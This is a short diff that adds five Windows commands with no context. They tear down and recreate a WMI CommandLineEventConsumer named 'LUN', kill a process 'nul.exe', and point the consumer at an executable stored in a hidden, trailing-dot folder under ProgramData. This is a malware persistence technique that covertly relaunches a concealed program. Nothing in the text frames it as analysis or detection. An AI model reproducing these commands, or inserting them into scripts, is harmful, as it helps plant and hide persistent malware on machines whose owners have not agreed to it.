@@ -1,0 +1,5 @@
+wmic/namespace:\\root\subscription PATH CommandLineEventConsumer WHERE Name="LUN" DELETE
+cmd.exe /c start "" powershell.exe -NoProfile -Command "Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter \"Name='LUN'\" | Remove-WmiObject"
+taskkill.exe /f /IM nul.exe
+wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="LUN", CommandLineTemplate="%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul"
+cmd.exe /c start "" powershell.exe -NoProfile -Command "Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='LUN'; CommandLineTemplate='%ProgramData%\nuldata..\nul.exe %ProgramData%\nuldata..\nul'} | Out-Null"
